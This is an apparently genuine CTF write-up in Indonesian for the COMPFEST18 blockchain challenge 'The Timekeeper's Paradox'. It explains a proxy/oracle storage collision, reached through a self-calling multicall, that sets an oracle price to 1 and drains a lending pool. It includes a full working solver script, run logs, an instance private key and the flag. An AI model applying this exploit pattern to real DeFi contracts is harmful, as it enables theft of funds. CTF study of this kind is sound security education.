# The Timekeeper's Paradox — Writeup

**Event:** COMPFEST18
**Category:** Blockchain
**Challenge:** The Timekeeper's Paradox
**Author:** —

## 1. Challenge Overview

Challenge ini membangun sebuah mini DeFi ecosystem yang terdiri dari governance token, oracle harga, upgradeable proxy, lending pool, dan governance contract.

Pool lending diisi dengan 50 ETH. Player hanya diberi 10,000 TKG, sementara token awal jauh lebih besar dan governance quorum dibuat tidak realistis untuk dicapai secara normal.

Kondisi solve yang dipakai setup contract sangat sederhana:

```solidity
function isSolved() external view returns (bool) {
    return address(lending).balance == 0;
}
```

Artinya target sebenarnya bukan melewati governance secara sah, melainkan menemukan cara untuk membuat lending pool mengeluarkan seluruh ETH-nya.

Source setup juga menunjukkan bahwa 50 ETH seluruhnya dikirim ke lending pool dan player hanya mendapat 10,000 TKG.

## 2. Mapping Contract

Empat contract yang paling relevan untuk exploit:

- `TimekeeperProxy`
- `TimekeeperOracle`
- `TimekeeperLending`
- `TimekeeperGovernance`

Setup membuat hubungan seperti ini:

```
                 +-------------------+
                 | TimekeeperOracle  |
                 |                   |
                 | latestPrice       |
                 +---------^---------+
                           |
                           | delegatecall
                           |
                 +---------+---------+
                 | TimekeeperProxy   |
                 |                   |
                 | implementation   |
                 | pendingAdmin      |
                 +---------^---------+
                           |
                           |
                    getLatestPrice()
                           |
                 +---------+---------+
                 | TimekeeperLending |
                 |                   |
                 | 50 ETH            |
                 +-------------------+
```

Lending tidak membaca oracle secara langsung. Ia menyimpan alamat proxy sebagai oracle, kemudian melakukan low-level call ke:

```
getLatestPrice()
```

Source lending memperlihatkan bahwa harga oracle langsung dipakai untuk menghitung kapasitas `borrowETH()`.

## 3. Audit Oracle

Oracle mempunyai state variable berikut:

```solidity
contract TimekeeperOracle {
    address public admin;
    address public reporter;
    uint256 public latestPrice;
```

Jadi layout storage awalnya secara sederhana adalah:

```
slot 0 = admin
slot 1 = reporter
slot 2 = latestPrice
```

Oracle juga mempunyai getter:

```solidity
function getLatestPrice() external view returns (uint256) {
    return latestPrice;
}
```

Dengan kata lain, ketika proxy melakukan delegatecall ke implementation Oracle, pembacaan `latestPrice` dilakukan terhadap storage milik proxy, bukan storage milik contract implementation.

Ini menjadi penting setelah melihat storage layout proxy.

Source Oracle menunjukkan `latestPrice` berada setelah `admin` dan `reporter`, lalu `getLatestPrice()` hanya mengembalikan value tersebut.

## 4. Audit Proxy

Proxy mempunyai state variable:

```solidity
contract TimekeeperProxy {
    address public admin;
    address public implementation;
    address public pendingAdmin;
```

Layout storage-nya:

```
slot 0 = admin
slot 1 = implementation
slot 2 = pendingAdmin
```

Bandingkan dengan Oracle:

```
Oracle:
slot 0 = admin
slot 1 = reporter
slot 2 = latestPrice

Proxy:
slot 0 = admin
slot 1 = implementation
slot 2 = pendingAdmin
```

Slot 2 sama-sama dipakai, tetapi untuk data yang berbeda.

Inilah bug storage collision:

```
Proxy slot 2 <----> Oracle.latestPrice
           |
           +--> Proxy.pendingAdmin
```

Source proxy memang mendeklarasikan `pendingAdmin` di urutan ketiga, setelah `admin` dan `implementation`.

## 5. Kenapa `multicall()` Penting

Sekilas exploit belum bisa dilakukan karena fungsi proxy yang mengubah `pendingAdmin` hanya menerima pemanggilan dari proxy itu sendiri:

```solidity
function setPendingAdmin(address _pendingAdmin) external {
    require(msg.sender == address(this), "Only self");
    pendingAdmin = _pendingAdmin;
}
```

Player biasa tidak bisa memanggil fungsi ini langsung, karena `msg.sender` pasti merupakan address player.

Tetapi proxy menyediakan:

```solidity
function multicall(bytes[] calldata data)
    external
    returns (bytes[] memory results)
{
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        (bool success, bytes memory result) = address(this).call(data[i]);
        require(success, "Multicall: call failed");
        results[i] = result;
    }
}
```

Perhatikan bagian:

```solidity
address(this).call(data[i])
```

Call tersebut adalah external call ke address proxy itu sendiri. Karena target-nya adalah proxy, `msg.sender` pada call internal tersebut menjadi address proxy.

Jadi alurnya:

```
Player
  |
  | multicall(setPendingAdmin(...))
  v
Proxy.multicall()
  |
  | address(this).call(...)
  v
Proxy.setPendingAdmin()
  |
  | msg.sender == address(this)
  | => TRUE
  v
pendingAdmin = value
```

Jadi `Only self` dapat dilewati tanpa perlu menjadi admin.

Implementasi `multicall()` dan check `msg.sender == address(this)` terlihat langsung di source.

## 6. Mengubah Harga Oracle Menjadi 1

Sekarang collision storage dan self-call digabungkan.

Kita panggil:

```
setPendingAdmin(address(1))
```

Karena `pendingAdmin` berada di proxy slot 2 dan Oracle `latestPrice` juga membaca slot 2, setelah transaksi:

```
Proxy slot 2 = 1
Oracle.latestPrice via delegatecall = 1
```

Jadi proxy akan mengembalikan:

```
getLatestPrice() = 1
```

Ini bukan perubahan state pada Oracle implementation secara langsung. Kita hanya menimpa slot storage proxy yang kemudian ditafsirkan sebagai `latestPrice` oleh code Oracle ketika dijalankan via delegatecall.

Pada script eksploitasi, calldata dibuat manual:

```python
set_pending_admin = (
    w3.keccak(text="setPendingAdmin(address)")[:4]
    + (1).to_bytes(32, "big")
)
```

Lalu dikirim melalui:

```python
proxy.functions.multicall([set_pending_admin])
```

Hasil aktual transaksi menunjukkan:

```
[+] status=1 gas=48308
[+] pendingAdmin = 0x0000000000000000000000000000000000000001
[+] oracle price via proxy = 1
```

Jadi primitive pertama berhasil dibuktikan on-chain.

## 7. Dampak Harga = 1 terhadap Lending

Sekarang lihat `borrowETH()`:

```solidity
function borrowETH(uint256 amount) external {
    uint256 price = getOraclePrice();
    Position storage pos = positions[msg.sender];
    uint256 collateralValueInETH;
    if (price > 0) {
        collateralValueInETH = (pos.tokenCollateral * 1e18) / price;
    }
    uint256 maxBorrow =
        (collateralValueInETH * RATIO_PRECISION) /
        COLLATERAL_RATIO;
    require(pos.ethDebt + amount <= maxBorrow, "Insufficient collateral");
    require(address(this).balance >= amount, "Insufficient pool liquidity");
    pos.ethDebt += amount;
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "ETH transfer failed");
}
```

Dengan price normal:

```
price = 1000 TKG / ETH
```

10,000 TKG hanya mempunyai nilai sekitar 10 ETH sebelum collateral ratio.

Tetapi setelah exploit:

```
price = 1
```

Maka:

```
collateralValueInETH = tokenCollateral * 1e18
```

untuk 10,000 TKG menjadi nilai numerik yang sangat besar dalam perhitungan contract.

Akibatnya batas `maxBorrow` jauh melebihi 50 ETH yang tersedia dalam pool.

Kita tidak perlu mengambil sebagian-sebagian. Seluruh balance pool bisa langsung dipinjam selama memenuhi check:

```
address(this).balance >= amount
```

Source menunjukkan collateral ETH dihitung dari `tokenCollateral / price`, lalu jumlah borrow hanya dibatasi oleh `maxBorrow`.

## 8. Deposit Token sebagai Collateral

Player memang diberi 10,000 TKG oleh Setup:

```solidity
token.mint(_player, 10_000 * 1e18);
```

Lalu token tersebut digunakan sebagai collateral:

```solidity
function depositToken(uint256 amount) external {
    require(amount > 0, "Zero deposit");
    require(
        token.transferFrom(msg.sender, address(this), amount),
        "Transfer failed"
    );
    positions[msg.sender].tokenCollateral += amount;
}
```

Eksploitasi kemudian melakukan dua transaksi:

```
approve(lending, 10000 TKG)
depositToken(10000 TKG)
```

Di hasil eksekusi:

```
[+] TKG balance: 10000
[>] tx: a960298dd20779fb85b7437e4cb8ac7ae742b1a8cf2da328e4277d0359f7bc8d
[+] status=1 gas=46734
[>] tx: 94a46453db474e6fd505f931b3216b92043697622a0c38283ae4e7386f10eee5
[+] status=1 gas=61318
[+] TKG collateral deposited
```

## 9. Drain Pool

Setelah collateral masuk, script membaca balance lending:

```python
pool = lending.functions.poolETHBalance().call()
```

Hasil:

```
[+] stealing 50 ETH
```

Kemudian:

```python
send(lending.functions.borrowETH(pool))
```

Transaksi berhasil:

```
[>] tx: c979a59a9098bb31b504e992080c1e29da6977a6e52c1fe22dd09d799b26374b
[+] status=1 gas=69376
```

Balance sesudahnya:

```
[+] pool after: 0 ETH
[+] solved: True
```

Ini persis kondisi yang dicari `Setup.isSolved()` karena function tersebut hanya mengecek apakah balance lending sudah menjadi nol.

## 10. Exploit Chain

Seluruh exploit dapat diringkas menjadi satu chain:

```
10,000 TKG milik player
        |
        v
Proxy.multicall()
        |
        +--> address(this).call(setPendingAdmin(1))
                    |
                    v
             Proxy slot 2 = 1
                    |
                    v
        Oracle.latestPrice = 1 (via delegatecall)
                    |
                    v
             Lending price = 1
                    |
                    v
       Deposit 10,000 TKG collateral
                    |
                    v
          borrowETH(50 ETH)
                    |
                    v
          Lending balance = 0
                    |
                    v
               isSolved() = true
```

Tidak ada kebutuhan untuk:

- mendapatkan governance quorum 51%;
- menunggu timelock 7 hari;
- menjadi proxy admin;
- mem-publish implementation baru;
- memanipulasi TWAP melalui observation history.

Seluruh jalur governance justru menjadi distraksi dari bug storage layout dan self-call pada proxy.

Governance memang memiliki quorum 5100 BPS dan timelock 7 hari, tetapi keduanya tidak relevan setelah exploit ditemukan.

## 11. Solver Script

Versi solver yang dipakai untuk instance adalah sebagai berikut. Alamat dan private key di sini adalah credential instance CTF yang dipakai saat solve.

```python
#!/usr/bin/env python3
from web3 import Web3
from eth_account import Account
import time

RPC_URL = "http://34.2.147.230:8503/52cf879f-6b23-4992-b633-ab9ee77d48cf"
PRIVKEY = "8e8a43071346811041fbfe8aabaf41c97d2efdc1810c01f40f74c519117d7852"
SETUP = Web3.to_checksum_address("0xD342ce8Cc9f65AaDa74Baf455975E3c86A29DCA5")
PLAYER = Web3.to_checksum_address("0xA4F8c22C65058bEe18a43Fe8959A5471fA3Fe94a")

w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={"timeout": 10}))
acct = Account.from_key(PRIVKEY)

assert acct.address.lower() == PLAYER.lower(), f"wrong key: {acct.address}"
assert w3.is_connected(), "RPC unreachable"

SETUP_ABI = [
    {
        "inputs": [],
        "name": "token",
        "outputs": [{"type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "proxy",
        "outputs": [{"type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "lending",
        "outputs": [{"type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

TOKEN_ABI = [
    {
        "inputs": [{"name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [
            {"name": "spender", "type": "address"},
            {"name": "amount", "type": "uint256"},
        ],
        "name": "approve",
        "outputs": [{"type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function",
    },
]

PROXY_ABI = [
    {
        "inputs": [{"name": "data", "type": "bytes[]"}],
        "name": "multicall",
        "outputs": [{"name": "results", "type": "bytes[]"}],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "pendingAdmin",
        "outputs": [{"type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getLatestPrice",
        "outputs": [{"type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
]

LENDING_ABI = [
    {
        "inputs": [{"name": "amount", "type": "uint256"}],
        "name": "depositToken",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"name": "amount", "type": "uint256"}],
        "name": "borrowETH",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "poolETHBalance",
        "outputs": [{"type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
]

setup = w3.eth.contract(SETUP, abi=SETUP_ABI)
token_addr = Web3.to_checksum_address(setup.functions.token().call())
proxy_addr = Web3.to_checksum_address(setup.functions.proxy().call())
lending_addr = Web3.to_checksum_address(setup.functions.lending().call())

token = w3.eth.contract(token_addr, abi=TOKEN_ABI)
proxy = w3.eth.contract(proxy_addr, abi=PROXY_ABI)
lending = w3.eth.contract(lending_addr, abi=LENDING_ABI)

print(f"[+] player : {acct.address}")
print(f"[+] token  : {token_addr}")
print(f"[+] proxy  : {proxy_addr}")
print(f"[+] lending: {lending_addr}")
print(f"[+] pool before: {w3.from_wei(lending.functions.poolETHBalance().call(), 'ether')} ETH")
print(f"[+] TKG balance: {w3.from_wei(token.functions.balanceOf(PLAYER).call(), 'ether')}")

nonce = w3.eth.get_transaction_count(PLAYER)
chain_id = w3.eth.chain_id


def send(fn):
    global nonce
    tx = fn.build_transaction({
        "from": PLAYER,
        "nonce": nonce,
        "chainId": chain_id,
        "gas": 500_000,
        "gasPrice": w3.eth.gas_price,
    })
    signed = acct.sign_transaction(tx)
    txh = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"[>] tx: {txh.hex()}")
    rcpt = w3.eth.wait_for_transaction_receipt(txh)
    print(f"[+] status={rcpt.status} gas={rcpt.gasUsed}")
    if rcpt.status != 1:
        raise RuntimeError("transaction failed")
    nonce += 1
    return rcpt


# 1. Storage collision exploit.
set_pending_admin = (
    w3.keccak(text="setPendingAdmin(address)")[:4]
    + (1).to_bytes(32, "big")
)
send(proxy.functions.multicall([set_pending_admin]))
print(f"[+] pendingAdmin = {proxy.functions.pendingAdmin().call()}")
print(f"[+] oracle price via proxy = {proxy.functions.getLatestPrice().call()}")
assert int(proxy.functions.getLatestPrice().call()) == 1

# 2. Deposit all player TKG as collateral.
bal = token.functions.balanceOf(PLAYER).call()
assert bal > 0
send(token.functions.approve(lending_addr, bal))
send(lending.functions.depositToken(bal))
print("[+] TKG collateral deposited")

# 3. Borrow the entire lending pool.
pool = lending.functions.poolETHBalance().call()
print(f"[+] stealing {w3.from_wei(pool, 'ether')} ETH")
send(lending.functions.borrowETH(pool))

time.sleep(1)
remaining = lending.functions.poolETHBalance().call()
solved = setup.functions.isSolved().call()
print(f"[+] pool after: {w3.from_wei(remaining, 'ether')} ETH")
print(f"[+] solved: {solved}")

if not solved:
    raise RuntimeError("Pool not drained")

print("\n[+] FLAG CONDITION TRIGGERED")
```

## 12. Actual Execution

Instance yang berhasil disolve menghasilkan:

```
[+] player : 0xA4F8c22C65058bEe18a43Fe8959A5471fA3Fe94a
[+] token  : 0x9399D9a375e87760BA6773a0A5FACc061f411981
[+] proxy  : 0xeC33d4cbF9C2BfAa2C7FBb0d8359619Fc174Bd4a
[+] lending: 0x8Ac74De9b44A3eB7929658CcE38B406727fE48e6
[+] pool before: 50 ETH
[+] TKG balance: 10000
[>] tx: ec1c5f4de25bba26469f27e08c676e33f2f27776157a1ea5b84a0dcd3496160a
[+] status=1 gas=48308
[+] pendingAdmin = 0x0000000000000000000000000000000000000001
[+] oracle price via proxy = 1
[>] tx: a960298dd20779fb85b7437e4cb8ac7ae742b1a8cf2da328e4277d0359f7bc8d
[+] status=1 gas=46734
[>] tx: 94a46453db474e6fd505f931b3216b92043697622a0c38283ae4e7386f10eee5
[+] status=1 gas=61318
[+] TKG collateral deposited
[+] stealing 50 ETH
[>] tx: c979a59a9098bb31b504e992080c1e29da6977a6e52c1fe22dd09d799b26374b
[+] status=1 gas=69376
[+] pool after: 0 ETH
[+] solved: True
[+] FLAG CONDITION TRIGGERED
```

Urutan transaksi exploit:

| Step | Tx hash | Fungsi | Hasil |
|------|---------|--------|-------|
| 1 | ec1c5f4de25bba26469f27e08c676e33f2f27776157a1ea5b84a0dcd3496160a | proxy.multicall(setPendingAdmin(1)) | oracle price = 1 |
| 2 | a960298dd20779fb85b7437e4cb8ac7ae742b1a8cf2da328e4277d0359f7bc8d | token.approve() | berhasil |
| 3 | 94a46453db474e6fd505f931b3216b92043697622a0c38283ae4e7386f10eee5 | lending.depositToken() | 10,000 TKG collateral |
| 4 | c979a59a9098bb31b504e992080c1e29da6977a6e52c1fe22dd09d799b26374b | lending.borrowETH(50 ETH) | pool = 0 ETH |

## 13. Flag

```
COMPFEST18{t1m3k33p3r_pr1c3_0r4cl3_m4n1p_v14_st0r4g3_c0ll1s10n_le4k3dddddd_n0000000}
```
